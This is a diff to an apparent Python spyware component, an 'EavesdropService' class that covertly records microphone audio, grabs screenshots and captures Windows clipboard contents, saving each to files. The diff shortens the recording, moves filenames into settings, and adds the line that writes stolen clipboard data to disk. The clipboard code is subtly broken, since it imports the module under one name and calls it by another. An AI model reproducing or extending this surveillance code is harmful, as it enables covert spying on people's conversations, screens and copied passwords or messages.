@@ -1,6 +1,6 @@
 import sys
 
-from settings import file_path
+from settings import file_path, filenames
 from PIL import ImageGrab
 from scipy.io.wavfile import write
 import sounddevice as sd
@@ -12,19 +12,19 @@ class EavesdropService:
     @staticmethod
     def microphone():
         fs = 44100
-        seconds = 10
+        seconds = 5
         recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
         sd.wait()
-        write(file_path + "\\" + "audio.wav", fs, recording)
+        write(file_path + "\\" + filenames["audio"], fs, recording)
 
     @staticmethod
     def screenshot():
         im = ImageGrab.grab()
-        im.save(file_path + "\\" + "screenshot.png")
+        im.save(file_path + "\\" + filenames["screenshot"])
 
     @staticmethod
     def copy_clipboard():
-        with open(file_path + "\\" + "e_clipboard.txt", "a") as f:
+        with open(file_path + "\\" + filenames["clipboard"], "a") as f:
             try:
                 if sys.platform == "win32":
                     import win32clipboard as clip
@@ -32,8 +32,7 @@ class EavesdropService:
                     pasted_data = win32clipboard.GetClipboardData()
                     win32clipboard.CloseClipboard()
                     print(pasted_data)
+                    f.write(pasted_data)
             except Exception as e:
                 f.write("Clipboard could be not be copied")
                 print(e)
-
-
